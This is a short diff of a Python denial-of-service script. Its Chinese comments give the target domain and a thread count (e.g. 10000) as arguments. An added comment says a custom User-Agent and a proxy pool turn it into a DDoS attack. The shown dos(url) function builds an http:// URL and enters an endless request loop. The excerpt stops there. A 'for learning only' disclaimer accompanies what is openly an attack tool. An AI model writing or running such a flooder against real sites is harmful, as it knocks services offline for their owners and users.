@@ -2,7 +2,8 @@ import threading,requests,sys
 
 # 本工具只做学习交流使用，请遵守法律法规，严禁使用本工具进行非法破坏
 # 第1个参数为攻击的域名,第2个参数为自定义线程数。eg:xxx.com  10000
-# 自定义UA头
+# 自定义UA头，可定义代理池变成ddos攻击
+
 def dos(url):
     url2='http://'+url
     while True:
